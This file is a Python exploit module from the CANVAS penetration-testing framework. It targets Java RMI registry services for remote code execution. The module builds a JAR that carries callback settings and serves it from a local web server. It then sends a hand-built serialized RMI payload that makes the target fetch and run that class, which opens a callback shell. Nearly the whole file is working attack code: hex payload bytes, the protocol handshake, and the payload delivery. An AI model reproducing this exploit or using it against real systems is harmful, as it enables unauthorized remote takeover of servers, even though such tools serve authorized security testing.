#!/usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2006
# http://www.immunityinc.com/CANVAS/ for more information

import sys

if "." not in sys.path:
    sys.path.append(".")

import socket, errno
import urllib
import random
import libs.spkproxy as spkproxy
import zipfile
import tempfile
import glob
import shutil
import csv
import pickle

import libs.java_deserialization_parser as javaparser

from exploitutils import *
from tcpexploit import *
from canvasexploit import *
from libs.apache_commons_deserialize import objectcreator

NAME                            = "java_rmi_service"
DESCRIPTION                     = "Java Remote Method Invocation Service Remote Code Execution"

DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Oracle"
DOCUMENTATION['Repeatability']  = "Infinite"
DOCUMENTATION['CVE Name']       = "NO-CVE"
DOCUMENTATION['References']     = [
    "https://docs.oracle.com/javase/8/docs/platform/rmi/spec/rmi-protocol3.html",
    "https://docs.oracle.com/javase/7/docs/platform/rmi/spec/rmi-protocol3.html",
    "https://docs.oracle.com/javase/7/docs/platform/rmi/spec/rmiTOC.html",
]

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Remote"
PROPERTY['VERSION']             = ["Java SE JDK and JRE 7","Java SE JDK and JRE 6 Update 27 and earlier",
                                   "Java SE JDK and JRE 5.0 Update 31 and earlier",
                                   "Java SE JDK and JRE 1.4.2_33 and earlier"]

DOCUMENTATION['NOTES'] = """
Remote Code Execution can be achieved if dangerous functionalities without
security measures are exposed via RMI.
This module communicates with RMI registry services and attempt to load an
external class from a .jar hosted in a web server, resulting in remote code
execution on the affected server.

The JAR Server will listen on the port provided in the UI. However, if that port
is unavailable, a random one will be chosen.

Newer versions may also be vulnerable but only if java.rmi.server.useCodebaseOnly
is set to false (this value was false by default on affected versions) and all
permissions are granted to the app on the security.policy file.

Versions tested:

> Linux
Java 1.5.0/rmiregistry
Java 1.6.18/rmiregistry
Java 1.7.0/rmiregistry
"""

CHANGELOG = """
"""

class theexploit(tcpexploit):
    # Clienside exploits default to HTTPMosdef PLAIN for clientD
    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.port = 1099
        self.jarserver_port = 8082
        self.host = ""
        self.version = 0
        self.done = 0
        self.ssl = ""
        self.name = NAME
        self.basepath = ""
        self.path = os.path.dirname(__file__)

        self.mosdef_type = "UNIVERSAL"
        self.http_ssl = False
        self.payloadType = 0
        # self.command            = None
        self.basicauth_user = ""
        self.basicauth_password = ""
        self.hostname = None
        self.content_type = ""
        self.file_name = randomstring(5)
        self.dir_name = "aaaah"

        self.ua = None
        self.javamosdef_data = None

        self.socket = socket.socket(socket.AF_INET)

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host = self.target.interface
        self.getarg("hostname")
        if not self.hostname:
            self.hostname = self.host
        self.port = int(self.argsDict.get("port", self.port))
        self.jarserver_port = int(self.argsDict.get("jarserver_port", self.jarserver_port))

        self.payloadType = self.argsDict.get("payloadType", self.payloadType)

        return

    def generate_jar(self):
        f = "./tmp/{}.zip".format(self.file_name)
        shutil.copyfile(os.path.join(self.path, "./Resources/mosdef.jar"), os.path.join(self.path, f))
        tmpfd, tmpname = tempfile.mkstemp(dir=os.path.join(os.path.dirname(__file__), os.path.dirname(f)))
        os.close(tmpfd)

        filename = "callback.dat"

        with zipfile.ZipFile(os.path.join(self.path, f), 'r') as zin:
            with zipfile.ZipFile(tmpname, 'w') as zout:
                zout.comment = zin.comment
                for item in zin.infolist():
                    if item.filename != filename:
                        zout.writestr(item, zin.read(item.filename))

        os.remove(os.path.join(self.path, f))
        os.rename(tmpname, os.path.join(self.path, f))

        data = """phost={}
pport={}
pconnection_type=0
puseSSL=false
pdebug=false""".format(self.callback.ip, self.callback.port)

        with zipfile.ZipFile(os.path.join(self.path, f), mode='a', compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(filename, data)
        os.rename(os.path.join(self.path, f), os.path.join(self.path, "./tmp/{}.jar".format(self.file_name)))

    def init_connection(self):
        logging.info("Testing if RMI service is listening...")

        magic_number = "4a524d49"
        version = "0002"  # could be 0001 also (it's used?)
        protocol = "4b"   # 4b=StreamProtocol ; 4c=SingleOpProtocol ; 4d=MultiplexProtocol
        message = "000000000000"
        outputStream = magic_number + version + protocol + message

        try:
            self.socket.sendall(outputStream.decode('hex'))
            response = self.recv_timeout()
        except socket.error as e:
            logging.error("Coulnd't connect")
            return False

        if response[:1] == "\x4e":
            logging.info("StreamProtocol supported")
            return True
        elif response[:1] == "\x4f":
            logging.info("StreamProtocol NOT supported")
            ## Implement another way using a different protocol?
            return False
        else:
            logging.error("Unexpected ProtocolAck Returns")
            self.check_response(response)
            return False

    def send_streamprotocol(self):
        logging.info("Sending payload via StreamProtocol...")
        message = "\x50"

        length = 7 + len(self.callback.ip) + 1 + len(str(self.jarserver_port)) + 1 + 9

        # 7 protocol
        # IP
        # 1 :
        # 4 PORT
        # 1 /
        # 9 filename

        payload = "aced0005772200000000000000020000"
        payload += "00000000000000000000000000000000"
        payload += "f6b6898d8bf28643757200185b4c6a61"
        payload += "76612e726d692e7365727665722e4f62"
        payload += "6a49443b"
        payload += "871300b8d02c647e"                                       #serial version ObjID
        payload += "02000070"
        payload += "78700000000077080000000000000000"
        payload += "7372000e"
        payload += "524d49436c6173734c6f61646572"                           # ClassName
        payload += "1fc409ffc24cb0e9"                                       # serial RMIClassLoader
        payload += "0200007400{:02x}".format(length)                        # Length "020000740023"
        payload += "687474703a2f2f"                                         # protocol
        payload += "{}".format((self.callback.ip).encode('hex'))            # IP "3139322e3136382e3135302e31"
        payload += "3a"
        payload += "{}".format(str((self.jarserver_port)).encode('hex'))    # Port "38303832"
        payload += "2f"
        payload += "{}2e6a6172".format((self.file_name).encode('hex'))      # Filename
        payload += "787077"
        payload += "0100"

        outputStream = message + payload.decode('hex')

        try:
            self.socket.sendall(outputStream)
            response = self.recv_timeout()

            #print response

            if response[:2] == "\x4e":
                logging.info("StreamProtocol supported")
                return True
            elif response[:2] == "\x4f":
                logging.info("StreamProtocol NOT supported")
                return False
            else:
                return self.check_response(response)
        except:
            logging.info("No response received but exploit will continue")
            return True

    def check_response(self, response):
        if 'RMI class loader disabled' in response:
            logging.error('Exploit failed: RMI class loader disabled')
            return False
        elif 'java.lang.ClassNotFoundException' in response and 'java.rmi.UnmarshalException' in response:
            logging.error('Exploit failed: java.rmi.server.useCodebaseOnly may be set as true')
            return False
        elif 'java.rmi.NoSuchObjectException' in response:
            logging.error('Exploit failed: java.rmi.NoSuchObjectException')
            return False
        else:
            logging.info('Unexpected response received but exploit will continue')
            return True

    def setup_webserver(self):
        app = self.engine.getModuleExploit("httpserver")
        app.link(self)
        app.argsDict["port"] = self.jarserver_port
        app.argsDict["singleexploit"] = "upload"
        app.argsDict["auto_port"] = True
        with open(os.path.join(os.path.dirname(__file__), "tmp", "{}.jar".format(self.file_name)), "rb") as handle:
            self.javamosdef_data = handle.read()
        app.argsDict["sourcedata"] = self.javamosdef_data
        return_value = app.listen()
        self.jarserver_port = app.port
        #print app.port
        return app

    def recv_timeout(self, timeout=2):
        tmp_socket = self.socket
        tmp_socket.setblocking(0)
        total_data = []
        data = ''

        begin = time.time()
        while True:
            if total_data and time.time() - begin > timeout:
                break
            elif time.time() - begin > timeout * 2:
                break

            try:
                data = tmp_socket.recv(8192)
                if data:
                    total_data.append(data)
                    begin = time.time()
                else:
                    time.sleep(0.1)
            except:
                pass

        return ''.join(total_data)

    def run(self):
        # Creating tmp directory
        if not os.path.exists(os.path.join(os.path.dirname(__file__), "./tmp")):
            os.makedirs(os.path.join(os.path.dirname(__file__),"./tmp"))
        # Cleaning existing payload
        files = glob.glob(os.path.join(self.path, './tmp/*'))
        for f in files:
            os.remove(f)

        # Get arguments
        self.getargs()

        self.host = self.target.interface

        # Generate .jar with callback parameters
        self.generate_jar()

        # Turn on payload delivery
        self.server = self.setup_webserver()
        logging.info("Started server for MOSDEF JAR")

        # Setting socket
        self.socket.settimeout(float(5))
        try:
            self.socket.connect((self.host, self.port))
        except socket.error as e:
            logging.error("Coulnd't connect")
            logging.critical("Exploit failed")
            return False

        # Test if RMI service is there
        self.init_connection()

        self.setInfo("%s attacking %s:%d (in progress)" % (self.name, self.host, self.port))

        if self.payloadType == "Java Generic (RMI)":
            # Test if RMI service supports Stream protocol
            if self.send_streamprotocol():
                got_connection = False
                while self.server.accept():
                    got_connection = True

                if got_connection:
                    logging.info("Got a connection to our jar server")
                    return True
                else:
                    logging.error("Failed to get a connection to the MOSDEF JAR server")
                    return False

            else:
                logging.critical("Exploit failed!")
        else:
            # Implement one different payload for every lib (commoncollections1,2,etc)
            logging.error("Invalid Payload")

        return False


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
